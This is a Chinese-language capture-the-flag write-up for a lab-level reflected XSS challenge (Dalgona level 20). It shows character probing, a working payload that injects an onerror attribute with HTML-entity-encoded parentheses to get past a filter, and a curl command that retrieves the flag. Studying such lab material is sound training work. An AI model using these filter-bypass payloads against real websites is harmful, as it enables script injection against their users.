## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 20 关
（样式表 `static/css/xss/xss20.css`，标题 `Dalgona - Star`）。

反射位置很特殊——输入被拼进一个**新生成的 `<img src="…">`**：

```html
<input type=text name=name placeholder="Enter your name..." ><img src="abc">
```

即模板是 `…><img src="{input}">`。

### 关键观察

**1. 过滤器会「整段丢弃」四类字符。**

逐字符探测（`Q<ch>Q`）：

| 字符 | 结果 |
| --- | --- |
| `<` `>` `(` `)` `` ` `` | **整个输入被丢弃**（反射为空） |
| 其它所有可打印字符 | 原样保留（含 `"` `'` `&` `#` `;` `/` 空格） |

**2. 所以既不能造标签，也不能直接写函数调用括号。**

`<svg onload=alert("XSS")>`、`<img src=x onerror=alert("XSS")>`、
`<input autofocus onfocus=…>`、`` alert`XSS` `` 全部失败（输入被丢）。

**3. 但 HTML 实体会在属性值里被解码 —— 用 `&#40;`/`&#41;` 代替括号。**

因为 `&` 和 `#` 都在允许集里，payload 先以实体形式通过过滤，
等浏览器解析属性时再还原成 `(` `)` 交给 JS：

```html
" onerror=alert&#40;'XSS'&#41; x="
```

实际渲染：

```html
<img src="" onerror=alert&#40;'XSS'&#41; x="">
```

浏览器把 `&#40;` 解码为 `(`，于是执行 `alert('XSS')`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=" onerror=alert&#40;'"'"'XSS'"'"'&#41; x="' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

（也可以用十六进制实体 `&#x28;` / `&#x29;`，效果相同。）

```text
flag{9a079e21-9116-4363-ad6f-36cdbdf8b584}
```

## 复盘

- **先逐字符探测，明确「丢弃」和「保留」两类。** 这一关不是替换字符，
  而是「含这些字符就整条丢弃」，判据是反射变空——与 011/016 的改写型过滤不同。
- **括号被禁时，HTML 实体是最省事的绕过。** 属性值里的字符实体会被 HTML 解析器
  解码后才交给 JS，所以 `&#40;` → `(`。前提是 `&`/`#` 没被过滤（本题放行）。
- **反射在属性里就不需要造标签。** 用 `"` 闭合 `src`，再用空格追加 `onerror`；
  这一招在 012/017 也用过，但这里因为括号被禁，多了一层实体编码。
- **`onerror` 需要图片加载失败。** 把 `src` 闭成空（`src=""`）必然加载失败，
  所以 `onerror` 一定会触发，不用额外构造坏 URL。
- **不要用反引号。** 反引号在本关被整段丢弃，是明确的过滤字符。
